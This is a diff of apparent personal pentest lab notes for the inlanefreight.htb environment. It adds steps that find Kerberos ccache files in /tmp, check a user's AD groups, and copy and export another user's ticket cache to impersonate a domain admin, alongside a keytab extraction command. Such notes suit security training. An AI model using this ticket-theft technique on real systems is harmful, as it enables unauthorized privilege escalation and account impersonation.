@@ -52,7 +52,16 @@ umarkhan@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keyta
 
 
 ====================================================================================================================
-Looking for ccache Files :- Start from here MR Khan 
+Step 1) root@linux01:~# ls -la /tmp :- Looking for ccache Files 
+Step 2) root@linux01:~# id julio@inlanefreight.htb :- Command to check which AD groups user Julio is part of. 
+Step 3) After identifying the user who has Admin access on the DC, we can impersonate that users
+        a) root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 . {krb5cc_647401106_I8I133 :- respective users Klist}
+        b) root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133 {This will escalate to the new user}
 
+
+====================================================================================================================
+
+
+Co
 
 
